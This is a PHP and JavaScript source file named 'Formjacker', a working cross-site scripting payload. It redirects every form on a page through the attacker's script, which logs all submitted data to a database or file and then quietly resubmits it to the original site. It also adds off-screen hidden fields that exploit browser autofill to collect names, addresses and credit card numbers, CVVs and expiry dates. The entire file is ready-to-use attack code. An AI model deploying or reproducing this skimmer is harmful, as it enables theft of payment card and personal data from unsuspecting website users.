<?php
  // Formjacker
  /*
    Man-in-the-middle every form on the page so that it sends data via this script. 
    All forms will submit to this script which will log all the form data and then submit to the original URL.
    Also add in invisible field elements to exploit browser autofill and extract form fill data (CC data, personal details etc) (https://github.com/anttiviljami/browser-autofill-phishing)
    Should automatically pick up CSRF tokens for standard HTML forms. Forms using AJAX requests and CSRF tokens in headers will fail.
  */
  
  // Pick either DB or file logging by commenting one of these out
  $logging = 'db';
  // $logging = 'file';
  
  // If you're using file logging, this is the path of the log file that the web server can write to
  $log_file = '/var/log/xssformjacker.log'; 

  // If you're using DB logging, set these up and make sure the those creds have access to the schema
  $db_user = 'xss';
  $db_pass = 'xss';
  $db_name = 'xss';
  $db_host = 'localhost';

  // Use this SQL to set up the DB
  // CREATE TABLE formjackerlog ( id int NOT NULL AUTO_INCREMENT, logtime DATETIME, ip varchar(15), method varchar(10), formdata TEXT, PRIMARY KEY (id) )


  $url = 'http';
  if( !empty( $_SERVER['HTTPS'] ) ){
    $url .= 's';
  }
  $url .= "://";
  if( empty( $_SERVER['HTTP_HOST'] ) ){
    $url .= $_SERVER["SERVER_ADDR"];
  }else{
    $url .= $_SERVER['HTTP_HOST'];
  }
  $url .= $_SERVER["PHP_SELF"];


  // Is this just being called as a script?
  if( sizeof( $_REQUEST ) == 0 ){
    header('Content-type: text/javascript');

?>

function xssFormJacker(){
  
  // Get all forms on page
  forms = document.querySelectorAll('form');
  Array.prototype.forEach.call( forms, form => {
    fields = form.querySelectorAll('input,select,textarea,button')
    
    // Get list of fields
    aFieldList = Array();
    Array.prototype.forEach.call( fields, field => {
      aFieldList.push( field.name );
    });

    // Add extra hidden fields 
    
    // text fields
    'name,email,phone,organization,address,postal,city,county,state,cc_number,cc_cvv'.split(',').forEach(function(name){
      if( aFieldList.includes( name ) ){
        return;
      }
      d = document.createElement('div')
      d.style = 'left: -500px; position: absolute;'
      f = document.createElement('input');
      f.type='text';
      f.name = name;
      d.appendChild( f );
      form.appendChild( d );
    });

    // Select boxes
    'country,cc_month,cc_year'.split(',').forEach(function(name){
      if( aFieldList.includes( name ) ){
        return;
      }
      d = document.createElement('div')
      d.style = 'left: -500px; position: absolute;'
      f = document.createElement('select');
      f.name = name;
     
      switch( name ){
        case 'country':
          f.innerHTML = '<option value=""></option><option value="FI">Finland</option><option value="AF">Afghanistan</option><option value="AX">Åland Islands</option><option value="AL">Albania</option><option value="DZ">Algeria</option><option value="AS">American Samoa</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctica</option><option value="AG">Antigua &amp; Barbuda</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AW">Aruba</option><option value="AC">Ascension Island</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BT">Bhutan</option><option value="BO">Bolivia</option><option value="BA">Bosnia &amp; Herzegovina</option><option value="BW">Botswana</option><option value="BV">Bouvet Island</option><option value="BR">Brazil</option><option value="IO">British Indian Ocean Territory</option><option value="VG">British Virgin Islands</option><option value="BN">Brunei</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="KH">Cambodia</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CV">Cape Verde</option><option value="BQ">Caribbean Netherlands</option><option value="KY">Cayman Islands</option><option value="CF">Central African Republic</option><option value="TD">Chad</option><option value="CL">Chile</option><option value="CN">China</option><option value="CX">Christmas Island</option><option value="CC">Cocos [Keeling] Islands</option><option value="CO">Colombia</option><option value="KM">Comoros</option><option value="CD">Congo [DRC]</option><option value="CG">Congo [Republic]</option><option value="CK">Cook Islands</option><option value="CR">Costa Rica</option><option value="CI">Côte d’Ivoire</option><option value="HR">Croatia</option><option value="CW">Curaçao</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DJ">Djibouti</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="GQ">Equatorial Guinea</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="ET">Ethiopia</option><option value="FK">Falkland Islands [Islas Malvinas]</option><option value="FO">Faroe Islands</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GF">French Guiana</option><option value="PF">French Polynesia</option><option value="TF">French Southern Territories</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option value="GR">Greece</option><option value="GL">Greenland</option><option value="GD">Grenada</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GG">Guernsey</option><option value="GN">Guinea</option><option value="GW">Guinea-Bissau</option><option value="GY">Guyana</option><option value="HT">Haiti</option><option value="HM">Heard &amp; McDonald Islands</option><option value="HN">Honduras</option><option value="HK">Hong Kong</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran</option><option value="IQ">Iraq</option><option value="IE">Ireland</option><option value="IM">Isle of Man</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JE">Jersey</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KI">Kiribati</option><option value="XK">Kosovo</option><option value="KW">Kuwait</option><option value="KG">Kyrgyzstan</option><option value="LA">Laos</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LY">Libya</option><option value="LI">Liechtenstein</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MO">Macau</option><option value="MK">Macedonia [FYROM]</option><option value="MG">Madagascar</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MH">Marshall Islands</option><option value="MQ">Martinique</option><option value="MR">Mauritania</option><option value="MU">Mauritius</option><option value="YT">Mayotte</option><option value="MX">Mexico</option><option value="FM">Micronesia</option><option value="MD">Moldova</option><option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MS">Montserrat</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="MM">Myanmar [Burma]</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="NC">New Caledonia</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="NU">Niue</option><option value="NF">Norfolk Island</option><option value="MP">Northern Mariana Islands</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PS">Palestine</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PN">Pitcairn Islands</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="QA">Qatar</option><option value="RE">Réunion</option><option value="RO">Romania</option><option value="RU">Russia</option><option value="RW">Rwanda</option><option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">São Tomé &amp; Príncipe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option><option value="SX">Sint Maarten</option><option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="SO">Somalia</option><option value="ZA">South Africa</option><option value="GS">South Georgia &amp; South Sandwich Islands</option><option value="KR">South Korea</option><option value="SS">South Sudan</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="BL">St. Barthélemy</option><option value="SH">St. Helena</option><option value="KN">St. Kitts &amp; Nevis</option><option value="LC">St. Lucia</option><option value="MF">St. Martin</option><option value="PM">St. Pierre &amp; Miquelon</option><option value="VC">St. Vincent &amp; Grenadines</option><option value="SR">Suriname</option><option value="SJ">Svalbard &amp; Jan Mayen</option><option value="SZ">Swaziland</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="TW">Taiwan</option><option value="TJ">Tajikistan</option><option value="TZ">Tanzania</option><option value="TH">Thailand</option><option value="TL">Timor-Leste</option><option value="TG">Togo</option><option value="TK">Tokelau</option><option value="TO">Tonga</option><option value="TT">Trinidad &amp; Tobago</option><option value="TA">Tristan da Cunha</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="TM">Turkmenistan</option><option value="TC">Turks &amp; Caicos Islands</option><option value="TV">Tuvalu</option><option value="UM">U.S. Outlying Islands</option><option value="VI">U.S. Virgin Islands</option><option value="UG">Uganda</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VA">Vatican City</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="WF">Wallis &amp; Futuna</option><option value="EH">Western Sahara</option><option value="YE">Yemen</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option>';
            break;

          case 'cc_month':
            f.innerHTML = '<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>';
            break;

          case 'cc_year':
<?php 
              for( $i=date('Y'); $i<=date('Y')+15; $i++ ){
                echo "            f.innerHTML += '<option>$i</option>';\n";
              }
            ?>
            break;
      }
      d.appendChild( f );
      form.appendChild( d );

    });
    
    // Remember the original fields
    f = document.createElement('input')
    f.type = 'hidden';
    f.name = 'origFieldList';
    f.value = aFieldList.join(',');
    form.appendChild( f );

    // Change the action URL
    f = document.createElement('input')
    f.type = 'hidden';
    f.name = 'origActionUrl';
    f.value = form.action;
    form.appendChild( f );
    form.action = '<?php echo $url; ?>';
  });
}

window.onload = xssFormJacker;

<?php

  // This is being proxied through, take the data, send back the form
  } else {
    header('Content-type: text/html');
    
    // print_r( $_REQUEST );

    // Log the info
    $data = array(
      date( 'Y-m-d H:i:s' ),
      $_SERVER['REMOTE_ADDR'],
      $_SERVER['REQUEST_METHOD'],
      print_r( $_REQUEST, true )
    );
    if( $logging == 'db' ){
      
      $db = new PDO("mysql:host={$db_host};dbname={$db_name};charset=utf8", $db_user, $db_pass);
      $sql = "INSERT INTO formjackerlog ( logtime, ip, method, formdata ) VALUES ( ?, ?, ?, ? )";
      $stmt = $db->prepare($sql);
      $stmt->execute($data);
      
    }else{
      
      file_put_contents( $log_file, print_r( $data, true ), FILE_APPEND );  

    }

    // Build the form
    if( !empty( $_REQUEST['origActionUrl'] ) ){
      echo "<html><body>";
      echo "<form id='xsspostback' action='".$_REQUEST['origActionUrl']."' method='".$_SERVER['REQUEST_METHOD']."'>\n";
      
      // Originally used fields
      if( !empty( $_REQUEST['origFieldList'] ) ){
        $aFields = preg_split( '/,/', $_REQUEST['origFieldList'] );
        foreach( $aFields as $f ){
          if( isset( $_REQUEST[$f] ) ){
            $v = $_REQUEST[$f];
            echo "<input type='hidden' name='$f' value='$v'>\n";
          }

        }
      }
      echo "</form>\n";
      echo "<script>document.getElementById('xsspostback').submit();</script>\n";
      echo "</body></html>";
    }else{
      header( 'Location: https://www.google.com' );
    }
  }
?>
